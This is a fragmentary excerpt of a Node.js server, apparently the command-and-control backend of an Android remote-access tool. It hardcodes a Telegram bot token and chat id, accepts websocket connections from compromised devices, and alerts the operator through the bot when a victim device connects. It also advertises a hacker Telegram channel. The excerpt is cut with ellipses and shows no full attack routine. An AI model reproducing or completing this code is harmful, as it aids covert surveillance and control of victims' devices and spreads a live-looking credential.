...
const token = '8795754408:AAE6ebuQulzD3Ifj1v38v-Skj_OdUvkRryw'
const id = '7023697791'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Telegram Channel➩ @badshah_hacker</p>')
})
...
appSocket.on('connection', (ws, req) => {
    ...
    appBot.sendMessage(id,
        `°• 🤠Badshah aapne device connect kr liya🤠\n\n` +
...
appBot.on('message', (message) => {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 🪴WELCOME TO (@badshah_hacker) CHANNEL🪴\n\n' +
                ...
                '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 @badshah_hacker\n\n' +
                '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @Bad_hacker1 \n\n' +
                '• 🧭𝗠𝗮𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹👉 @badshah_hacker \n\n' +
